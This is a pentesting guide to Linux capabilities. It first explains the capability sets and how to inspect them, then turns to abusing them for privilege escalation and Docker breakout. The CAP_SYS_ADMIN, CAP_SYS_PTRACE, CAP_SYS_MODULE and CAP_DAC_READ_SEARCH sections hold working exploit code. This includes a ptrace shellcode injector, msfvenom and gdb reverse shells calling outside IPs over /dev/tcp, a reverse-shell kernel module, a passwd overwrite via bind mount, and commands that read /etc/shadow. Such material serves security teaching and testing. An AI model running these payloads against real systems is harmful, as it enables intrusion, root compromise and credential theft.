# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities divide **root privileges into smaller, distinct units**, allowing processes to have a subset of privileges. This minimizes the risks by not granting full root privileges unnecessarily.

### The Problem:

- Normal users have limited permissions, affecting tasks like opening a network socket which requires root access.

### Capability Sets:

1. **Inherited (CapInh)**:

   - **Purpose**: Determines the capabilities passed down from the parent process.
   - **Functionality**: When a new process is created, it inherits the capabilities from its parent in this set. Useful for maintaining certain privileges across process spawns.
   - **Restrictions**: A process cannot gain capabilities that its parent did not possess.

2. **Effective (CapEff)**:

   - **Purpose**: Represents the actual capabilities a process is utilizing at any moment.
   - **Functionality**: It's the set of capabilities checked by the kernel to grant permission for various operations. For files, this set can be a flag indicating if the file's permitted capabilities are to be considered effective.
   - **Significance**: The effective set is crucial for immediate privilege checks, acting as the active set of capabilities a process can use.

3. **Permitted (CapPrm)**:

   - **Purpose**: Defines the maximum set of capabilities a process can possess.
   - **Functionality**: A process can elevate a capability from the permitted set to its effective set, giving it the ability to use that capability. It can also drop capabilities from its permitted set.
   - **Boundary**: It acts as an upper limit for the capabilities a process can have, ensuring a process doesn't exceed its predefined privilege scope.

4. **Bounding (CapBnd)**:

   - **Purpose**: Puts a ceiling on the capabilities a process can ever acquire during its lifecycle.
   - **Functionality**: Even if a process has a certain capability in its inheritable or permitted set, it cannot acquire that capability unless it's also in the bounding set.
   - **Use-case**: This set is particularly useful for restricting a process's privilege escalation potential, adding an extra layer of security.

5. **Ambient (CapAmb)**:
   - **Purpose**: Allows certain capabilities to be maintained across an `execve` system call, which typically would result in a full reset of the process's capabilities.
   - **Functionality**: Ensures that non-SUID programs that don't have associated file capabilities can retain certain privileges.
   - **Restrictions**: Capabilities in this set are subject to the constraints of the inheritable and permitted sets, ensuring they don't exceed the process's allowed privileges.

```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
    if process.has_capability('cap_setpcap'):
        process.add_capability_to_set('CapPrm', 'new_capability')
    process.limit_capabilities('CapBnd')
    process.preserve_capabilities_across_execve('CapAmb')
```

For further information check:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.\
Note that for all running processes capability information is maintained per thread, for binaries in the file system it’s stored in extended attributes.

You can find the capabilities defined in /usr/include/linux/capability.h

You can find the capabilities of the current process in `cat /proc/self/status` or doing `capsh --print` and of other users in `/proc/<pid>/status`

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

This command should return 5 lines on most systems.

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

These hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Lets check now the **capabilities** used by `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID (PID). You can also provide a list of process IDs.

```bash
getpcaps 1234
```

Lets check here the capabilities of `tcpdump` after having giving the binary enough capabilities (`cap_net_admin` and `cap_net_raw`) to sniff the network (_tcpdump is running in process 9562_):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

As you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a binary.\
The _getpcaps_ tool uses the **capget()** system call to query the available capabilities for a particular thread. This system call only needs to provide the PID to obtain more information.

### Binaries Capabilities

Binaries can have capabilities that can be used while executing. For example, it's very common to find `ping` binary with `cap_net_raw` capability:

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

You can **search binaries with capabilities** using:

```bash
getcap -r / 2>/dev/null
```

### Dropping capabilities with capsh

If we drop the CAP*NET_RAW capabilities for \_ping*, then the ping utility should no longer work.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.

### Remove Capabilities

You can remove capabilities of a binary with

```bash
setcap -r </path/to/binary>
```

## User Capabilities

Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.\
Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.\
File example:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Environment Capabilities

Compiling the following program it's possible to **spawn a bash shell inside an environment that provides capabilities**.

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Inside the **bash executed by the compiled ambient binary** it's possible to observe the **new capabilities** (a regular user won't have any capability in the "current" section).

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> You can **only add capabilities that are present** in both the permitted and the inheritable sets.

### Capability-aware/Capability-dumb binaries

The **capability-aware binaries won't use the new capabilities** given by the environment, however the **capability dumb binaries will us**e them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.

## Service Capabilities

By default a **service running as root will have assigned all the capabilities**, and in some occasions this may be dangerous.\
Therefore, a **service configuration** file allows to **specify** the **capabilities** you want it to have, **and** the **user** that should execute the service to avoid running a service with unnecessary privileges:

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities in Docker Containers

By default Docker assigns a few capabilities to the containers. It's very easy to check which capabilities are these by running:

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### The special case of "empty" capabilities

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)

then **that binary will run as root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is a highly potent Linux capability, often equated to a near-root level due to its extensive **administrative privileges**, such as mounting devices or manipulating kernel features. While indispensable for containers simulating entire systems, **`CAP_SYS_ADMIN` poses significant security challenges**, especially in containerized environments, due to its potential for privilege escalation and system compromise. Therefore, its usage warrants stringent security assessments and cautious management, with a strong preference for dropping this capability in application-specific containers to adhere to the **principle of least privilege** and minimize the attack surface.

**Example with binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

And finally **mount** the modified `passwd` file on `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

And you will be able to **`su` as root** using password "password".

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the SYS_ADMIN capability is enabled.

- **Mount**

This allows the docker container to **mount the host disk and access it freely**:

```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```

- **Full access**

In the previous method we managed to access the docker host disk.\
In case you find that the host is running an **ssh** server, you could **create a user inside the docker host** disk and access it via SSH:

```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```

## CAP_SYS_PTRACE

**This means that you can escape the container by injecting a shellcode inside some process running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** grants the ability to use debugging and system call tracing functionalities provided by `ptrace(2)` and cross-memory attach calls like `process_vm_readv(2)` and `process_vm_writev(2)`. Although powerful for diagnostic and monitoring purposes, if `CAP_SYS_PTRACE` is enabled without restrictive measures like a seccomp filter on `ptrace(2)`, it can significantly undermine system security. Specifically, it can be exploited to circumvent other security restrictions, notably those imposed by seccomp, as demonstrated by [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Example with binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Example with binary (gdb)**

`gdb` with `ptrace` capability:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Create a shellcode with msfvenom to inject in memory via gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debug a root process with gdb ad copy-paste the previously generated gdb lines:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Example with environment (Docker breakout) - Another gdb Abuse**

If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).

> [!WARNING]
> If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

You can check the enabled capabilities inside the docker container using:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks, as it enables privilege escalation and total system compromise by allowing modifications to the kernel, thereby bypassing all Linux security mechanisms, including Linux Security Modules and container isolation.
**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**

**Example with binary**

In the following example the binary **`python`** has this capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
In order to abuse this, lets create a fake **lib/modules** folder:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Then **compile the kernel module you can find 2 examples below and copy** it to this folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Finally, execute the needed python code to load this kernel module:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Example 2 with binary**

In the following example the binary **`kmod`** has this capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the **SYS_MODULE** capability is enabled.

**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> The blank char before each make word in the Makefile **must be a tab, not spaces**!

Execute `make` to compile it.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**The code of this technique was copied from the laboratory of "Abusing SYS_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**

**Example with binary**

The binary will be able to read any file. So, if a file like tar has this capability it will be able to read the shadow file:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Example with binary2**

In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

And in order to read a file you could do:

```python
print(open("/etc/shadow", "r").read())
```

**Example in Environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
